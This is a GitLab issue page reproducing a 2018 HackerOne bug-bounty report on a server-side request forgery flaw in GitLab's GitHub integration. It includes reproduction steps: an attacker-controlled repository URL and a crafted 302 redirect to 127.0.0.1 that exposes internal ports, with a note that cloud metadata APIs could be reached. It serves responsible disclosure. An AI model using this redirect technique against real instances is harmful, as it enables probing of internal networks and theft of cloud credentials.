=== Content from gitlab.com_120e7d00_20250120_234740.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

Project 'gitlab-org/gitlab-ce' was moved to 'gitlab-org/gitlab-foss'. Please update any links and bookmarks that may still have the old path.

# GitLab's GitHub integration is vulnerable to SSRF redirect vulnerability

**[HackerOne report #446593](https://hackerone.com/reports/446593)** by jobert on 2018-11-18:

The GitHub service is vulnerable to a SSRF vulnerability. An attacker may be able to leverage this to make arbitrary `POST` requests in a GitLab instance's internal network. It can also be used to connect to cloud provider's instance metadata API, which may result in the ability to execute commands on the machine.

# Proof of concept

In order to reproduce the SSRF, follow the steps below.

* Sign in as any user
* Create a new project
* Add a `.gitlab-ci.yml` file with the following contents:

**.gitlab-ci.yml**

```
# This file is a template, and might need editing before it works on your project.
# see https://docs.gitlab.com/ce/ci/yaml/README.html for all available options

# you can delete this line if you're not using Docker
image: busybox:latest

before_script:
  - echo "Before script section"
  - echo "For example you might run an update here or install a build dependency"
  - echo "Or perhaps you might print out some debugging details"

after_script:
  - echo "After script section"
  - echo "For example you might do some cleanup here"

build1:
  stage: build
  script:
    - echo "Do your build here"

test1:
  stage: test
  script:
    - echo "Do a test here"
    - echo "For example run a test suite"

test2:
  stage: test
  script:
    - echo "Do another parallel test here"
    - echo "For example run a lint test"

deploy1:
  stage: deploy
  script:
    - echo "Do your deploy here"
```

* Before a minute to make sure the pipelines are created based on the GitLab CI configuration file
* Set up the GitHub integration and an external repository URL that is under your control (e.g. <http://remote_ip/1/2>)
* Click the the `Test settings and save changes` button
* Observe a request being made to the endpoint that looks something like this:

```
POST /api/v3/repos/1/2/statuses/5509244fe4919b85f5c1e0e1a2340805055c32d9 HTTP/1.1
Accept: application/vnd.github.v3+json
User-Agent: Octokit Ruby Gem 4.9.0
Content-Type: application/json
Authorization: token 1
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Connection: close
Host: remote_ip
Content-Length: 158

{"context":"ci/gitlab/master","description":"Pipeline passed on GitLab","target_url":"https://gitlab.com/jobertabma/123/pipelines/36992118","state":"success"}
```

* respond with a 302 Found response that redirects back to the internal network using the `Location` header:

**Response**

```
HTTP/1.1 302 Found
Location: http://127.0.0.1/
Connection: Close
Content-Length: 0
```

* Observe the response of `127.0.0.1` (port 80) being returned in the UI through the error message:

[![Screen_Shot_2018-11-17_at_8.53.28_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/cf9d11dc4fb956ad9e0153b67e96513fc6ff64af/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3434363539332f3337373139352f53637265656e5f53686f745f323031382d31312d31375f61745f382e35332e32385f504d2e706e67)

* Or, port 8080:

[![Screen_Shot_2018-11-17_at_8.54.27_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/3dade73ef181a177a1438ea36e37215a9139215c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3434363539332f3337373139362f53637265656e5f53686f745f323031382d31312d31375f61745f382e35342e32375f504d2e706e67)

* Or, port 22:

[![Screen_Shot_2018-11-17_at_8.55.21_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/90301885393edee2efcae6bced5d8f6a9e06807a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3434363539332f3337373139372f53637265656e5f53686f745f323031382d31312d31375f61745f382e35352e32315f504d2e706e67)

## Impact

An attacker may be able to leverage this to make arbitrary `POST` requests in a GitLab instance's internal network. It can also be used to connect to cloud provider's instance metadata API, which may result in the ability to execute commands on the machine.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Shot\_2018-11-17\_at\_8.55.21\_PM.png](https://h1.sec.gitlab.net/a/446593/377197/Screen_Shot_2018-11-17_at_8.55.21_PM.png)
* [Screen\_Shot\_2018-11-17\_at\_8.54.27\_PM.png](https://h1.sec.gitlab.net/a/446593/377196/Screen_Shot_2018-11-17_at_8.54.27_PM.png)
* [Screen\_Shot\_2018-11-17\_at\_8.53.28\_PM.png](https://h1.sec.gitlab.net/a/446593/377195/Screen_Shot_2018-11-17_at_8.53.28_PM.png)

Edited Jul 30, 2019 by [GitLab SecurityBot](/gitlab-securitybot)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


